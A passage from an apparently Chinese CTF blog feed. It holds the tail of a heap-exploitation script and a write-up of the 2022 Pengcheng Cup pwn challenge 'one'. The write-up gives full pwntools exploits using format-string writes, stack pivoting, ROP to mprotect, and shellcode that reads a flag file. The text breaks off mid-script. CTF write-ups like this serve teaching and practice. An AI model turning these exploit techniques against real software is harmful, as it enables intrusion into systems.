class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0xb0</span>)<span class="comment">#chunk9</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)<span class="comment">#chunk0</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x410</span>)<span class="comment">#chunk1</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x70</span>)<span class="comment">#chunk2</span></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x70</span>)<span class="comment">#chunk3</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xb0</span>)<span class="comment">#chunk7</span></span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0x410</span>)<span class="comment">#chunk10</span></span><br><span class="line">    add(<span class="number">15</span>,<span class="number">0x14b0</span>)</span><br><span class="line">    add(<span class="number">14</span>,<span class="number">0x14c0</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xb0</span>)<span class="comment">#chunk8</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#chunk2-&gt;chunk0-&gt;chunk3</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    <span class="comment">#chunk8-&gt;chunk7-&gt;chunk9</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">&#x27;\xe0&#x27;</span>)<span class="comment">#unsorted bin chunk get into tcache bin</span></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;\x40\xf9&#x27;</span>)<span class="comment">#tamper main_arena+96 to global max fast</span></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">&#x27;\xc8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\x80\xe6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">0x7fff</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0xb0</span>)</span><br><span class="line">    add(<span class="number">12</span>,<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0xb0</span>)<span class="comment">#stderr</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x23E3</span>,<span class="number">0x23EF</span>,<span class="number">0x2297</span>,<span class="number">0x23FB</span>)</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    delete(<span class="number">15</span>)</span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x90&#x27;</span></span><br><span class="line">    edit(<span class="number">13</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------&gt;&#x27;</span>+<span class="built_in">str</span>(cnt))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="../img/image-20221031183954894.png" alt="image-20221031183954894"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> 爆破 </tag>
            
            <tag> 沙箱逃逸 </tag>
            
            <tag> off by null </tag>
            
            <tag> orw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022鹏城杯 pwn--one--wp</title>
      <link href="/posts/69f62957.html"/>
      <url>/posts/69f62957.html</url>
      
        <content type="html"><![CDATA[<p>这次比赛由于本人较菜，只做出了一道格式化字符串的那道题（比赛24个小时，这道题我打了18个小时，是真菜），在知道roderick师傅三小时做了四道题之后，就感觉自己更菜了  o(╥﹏╥)o 然后由于堆题的libc版本都很高，所以暂时先没打算复现（主要菜狗才刚把低版本libc的堆基础漏洞学完）</p><p>这里就记录一下one这道题的解题过程(我最开始自己做的用的方法很麻烦，我主要讲roderick师傅的解题思路吧，文末记录一下我最开始的方法)</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220708092007160-975113525.png" alt=""></p><p><img src="../img/2706180-20220708092014185-1776221359.png" alt=""></p><h2 id="漏洞所在：">漏洞所在：</h2><p><img src="../img/2706180-20220708092025352-837133436.png" alt=""></p><p>首先这道题自己泄露了栈地址。</p><p><img src="../img/2706180-20220708092035347-601191170.png" alt=""></p><p>然后在login函数中，如果把s装满，那%s就可以泄露出一个程序地址，此时得到了程序基地址(以此来对抗PIE保护)，接着就是存在一个格式化字符串漏洞（不过只能执行一次）</p><p>然后对抗沙箱保护，采用的方式是orw读出flag，但是close(1)给读出flag造成了一些困扰，对抗措施是将stdout重定向到IO_2_1_stderr让程序重新具有回显。</p><h2 id="大致思路：">大致思路：</h2><p>由于有栈地址和程序基地址，所以这道题利用起来也不难，只要将stdout重定向一下，再获取一下libc地址，打orw即可。</p><p>先考虑如何控制程序执行流</p><p>我们是知道栈地址的，而且read读入了0x200的数据，这个数据量可以做很多事情，所以考虑用格式化字符串来实现栈迁移去执行我们布置到栈上的rop链。</p><p>rop链先考虑用magic gadget(<a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">magic gadget我这篇文章具体介绍了</a>)去将stdout重定向到IO_2_1_stderr，然后利用gadget片段去执行puts函数泄露libc地址(因为此时标准输出已经重启)，接着用csu中的gadget片段执行read函数，再次布置一条rop链。</p><p>先说第一条rop链吧。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=fmtstr_payload(offset=<span class="number">6</span>,writes&#123;rbp_addr:leak_stack_addr+<span class="number">0x118</span>,rbp_addr+<span class="number">8</span>:code_base+<span class="number">0x14D7</span>&#125;,write_size_max=<span class="string">&quot;byte&quot;</span>,write_size=<span class="string">&quot;byte&quot;</span>)</span><br><span class="line">payload+=p64(pop_rbx_rbp)+p64(magic_offset)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])+p64(code_base+e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x153A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(leak_stack_addr+<span class="number">0x120</span>)+p64(<span class="number">0x500</span>)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x1520</span>)</span><br></pre></td></tr></table></figure><p>这里建议使用fmtstr_payload这个模块，不然手写的话非常难受，因为一次只能写入0x2000的字节（因为标准输出被关闭了，更深层次原因未知），这就意味着一次只能改写一个字节。把栈地址一字节一字节写入的话，还需要考虑每个字节的大小。如果实现的话如下（也可能还有更简单的实现方法，但是比赛的时候我这个菜菜是这么做的）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l1=(start_addr)&amp;<span class="number">0xff</span></span><br><span class="line">l2=(start_addr&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m1=(start_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m2=(start_addr&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span></span><br><span class="line">h1=(start_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span></span><br><span class="line">h2=(start_addr&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span></span><br><span class="line">dic=&#123;l1:<span class="number">0</span>,l2:<span class="number">1</span>,m1:<span class="number">2</span>,m2:<span class="number">3</span>,h1:<span class="number">4</span>,h2:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">list</span>=[l1,l2,h1,h2,m1,m2]</span><br><span class="line">list_sort=<span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line"><span class="built_in">print</span>(list_sort)</span><br><span class="line"><span class="keyword">if</span> bss_hook&lt;<span class="number">0x2000</span> <span class="keyword">and</span> (list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> bss_hook&gt;<span class="number">0x3e8</span> <span class="keyword">and</span> (list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>])&gt;<span class="number">9</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%17$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%18$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%19$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%20$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%21$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(bss_hook-list_sort[<span class="number">5</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%284$hna&#x27;</span></span><br><span class="line">payload+=p64(bss_addr+dic[list_sort[<span class="number">0</span>]])+p64(bss_addr+dic[list_sort[<span class="number">1</span>]])+p64(bss_addr+dic[list_sort[<span class="number">2</span>]])</span><br><span class="line">payload+=p64(bss_addr+dic[list_sort[<span class="number">3</span>]])+p64(bss_addr+dic[list_sort[<span class="number">4</span>]])+p64(bss_addr+dic[list_sort[<span class="number">5</span>]])</span><br></pre></td></tr></table></figure><p>所以还是建议比赛的时候用工具(但是不能只会用工具)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(pop_rbx_rbp)+p64(magic_offset)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])+p64(code_base+e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x153A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(leak_stack_addr+<span class="number">0x120</span>)+p64(<span class="number">0x500</span>)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x1520</span>)</span><br></pre></td></tr></table></figure><p>这部分就是传参执行了一次magic gadget，一次puts,一次read函数。</p><p>然后因为要执行流要衔接到第二次rop链上，这就很考验read到底把数据精准写到哪。完全可以通过调试来看一下执行流最终到了哪个栈地址，不过在输入的字节数很充裕的情况下可以直接布置很多的ret指令，来往下滑，滑到rop链上。这次的rop链采用的是执行mprotect函数，将栈区变成可执行的，然后打shellcode获取flag。</p><p>下面是第二次的rop链</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(code_base+<span class="number">0x1544</span>)*<span class="number">0x30</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi_addr)+p64(<span class="number">0x500</span>)+p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect)+p64(leak_stack_addr+<span class="number">0x120</span>+<span class="number">0x1c0</span>)<span class="comment">#这里要垫一个shellcode的地址，然后用ret去执行</span></span><br><span class="line">payload+=asm(shellcraft.cat(<span class="string">&quot;flag.txt&quot;</span>, <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h2 id="完整EXP：">完整EXP：</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from pwncli import *</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> load,log_addr,log,debug</span><br><span class="line"><span class="comment">#p,e,libc=load(&#x27;a&#x27;)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#log_addr(&#x27;leak_stack_addr&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;username:&#x27;</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">leak_base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">code_base=leak_base_addr-<span class="number">0x11a0</span></span><br><span class="line"><span class="comment">#log_addr(&#x27;code_base&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr=code_base+<span class="number">0x1543</span></span><br><span class="line">magic_addr=code_base+<span class="number">0x1272</span></span><br><span class="line">rbp_addr=leak_stack_addr+<span class="number">0x810</span></span><br><span class="line">pop_rbx_rbp=code_base+<span class="number">0x153A</span></span><br><span class="line">stdout=code_base+<span class="number">0x4020</span></span><br><span class="line">magic_offset=libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x1ed6a0</span> +<span class="number">0x1000000000000000</span></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x153A)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">log(<span class="string">&#x27;leak_stack_addr+0x120&#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr+<span class="number">0x120</span>))</span><br><span class="line">payload=fmtstr_payload(offset=<span class="number">6</span>,writes=&#123;rbp_addr:leak_stack_addr+<span class="number">0x118</span>,rbp_addr+<span class="number">8</span>:code_base+<span class="number">0x14D7</span>&#125;,write_size_max=<span class="string">&quot;byte&quot;</span>,write_size=<span class="string">&quot;byte&quot;</span>)</span><br><span class="line">payload+=p64(pop_rbx_rbp)+p64(magic_offset)+p64(stdout+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(magic_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])+p64(code_base+e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x153A</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(leak_stack_addr+<span class="number">0x120</span>)+p64(<span class="number">0x500</span>)+p64(code_base+e.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(code_base+<span class="number">0x1520</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base_addr=read_addr-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">pop_rsi_addr=libc_base_addr+<span class="number">0x2601f</span></span><br><span class="line">pop_rdx_addr=libc_base_addr+<span class="number">0x142c92</span></span><br><span class="line">mprotect=libc_base_addr+<span class="number">0x1189a0</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">payload=p64(code_base+<span class="number">0x1544</span>)*<span class="number">0x30</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi_addr)+p64(<span class="number">0x500</span>)+p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect)+p64(leak_stack_addr+<span class="number">0x120</span>+<span class="number">0x1c0</span>)</span><br><span class="line">payload+=asm(shellcraft.cat(<span class="string">&quot;flag.txt&quot;</span>, <span class="number">2</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="笨比在比赛写的exp">笨比在比赛写的exp</h2><p>我最开始考虑的方法是劫持栈里存放的一个ld.so的指针，这个指针可以影响在exit调用链上的一个call，所以在此处劫持执行流，然后再不断用格式化字符去劫持printf自己的返回地址，期间利用格式化字符串来完成stdout的重定向，而且这里还需要爆破，然后还有一个排序的那里为了保证是两个字节占位也需要爆破（但是赛后我想了一下，再好好处理一下，这里的爆破应该就能免了），然后重定向之后，最后一次payload里面既有格式化字符串，也有rop链，所以我采用的方式是用csu中的片段将格式化字符串给弹出去，至此执行流到我的rop链上。(这个权当记录一下吧，因为太麻烦(爆破的概率太低，具体概率多大我也没算不过应该爆个三四百次才能出一次把)，参考意义不大)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeat</span>():</span><br><span class="line">    p.sendafter(<span class="string">&#x27;username:&#x27;</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">    leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_stack_addr&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;username:&#x27;</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    leak_base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    base_addr=leak_base_addr-<span class="number">0x11a0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    start_addr=base_addr+<span class="number">0x140B</span><span class="comment">#0x148C</span></span><br><span class="line">    bss_addr=base_addr+<span class="number">0x4048</span></span><br><span class="line">    bss_hook=(bss_addr-<span class="number">0x3d60</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">    l1=(start_addr)&amp;<span class="number">0xff</span></span><br><span class="line">    l2=(start_addr&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    m1=(start_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    m2=(start_addr&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    h1=(start_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    h2=(start_addr&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="comment"># bss_h=(bss_hook)&amp;0xff</span></span><br><span class="line">    <span class="comment"># bss_l=(bss_hook&gt;&gt;8)&amp;0xff</span></span><br><span class="line">    log_addr(<span class="string">&#x27;m1&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;h1&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;h2&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;l2&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;m2&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;start_addr&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;bss_hook&#x27;</span>)</span><br><span class="line">    dic=&#123;l1:<span class="number">0</span>,l2:<span class="number">1</span>,m1:<span class="number">2</span>,m2:<span class="number">3</span>,h1:<span class="number">4</span>,h2:<span class="number">5</span>&#125;</span><br><span class="line">    <span class="built_in">list</span>=[l1,l2,h1,h2,m1,m2]</span><br><span class="line">    list_sort=<span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line">    <span class="built_in">print</span>(list_sort)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> bss_hook&lt;<span class="number">0x2000</span> <span class="keyword">and</span> (list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> bss_hook&gt;<span class="number">0x3e8</span> <span class="keyword">and</span> (list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>])&gt;<span class="number">9</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;------&gt;success&lt;------&#x27;</span>)</span><br><span class="line">        payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%17$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%18$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%19$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%20$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%21$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(bss_hook-list_sort[<span class="number">5</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%284$hna&#x27;</span></span><br><span class="line">        payload+=p64(bss_addr+dic[list_sort[<span class="number">0</span>]])+p64(bss_addr+dic[list_sort[<span class="number">1</span>]])+p64(bss_addr+dic[list_sort[<span class="number">2</span>]])</span><br><span class="line">        payload+=p64(bss_addr+dic[list_sort[<span class="number">3</span>]])+p64(bss_addr+dic[list_sort[<span class="number">4</span>]])+p64(bss_addr+dic[list_sort[<span class="number">5</span>]])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    stdout=base_addr+<span class="number">0x4020</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">    return_addr=leak_stack_addr-<span class="number">0xf8</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8C</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%8$hhnaaaaa&#x27;</span>+p64(return_addr)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;aaaaaaaaaaaaaaaa%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x7C</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaaa&#x27;</span>+p64(return_addr)+p64(stdout)+p64(stdout+<span class="number">1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0x14B9,0x146C)</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8c</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%11$hhn%&#x27;</span>+<span class="built_in">str</span>(<span 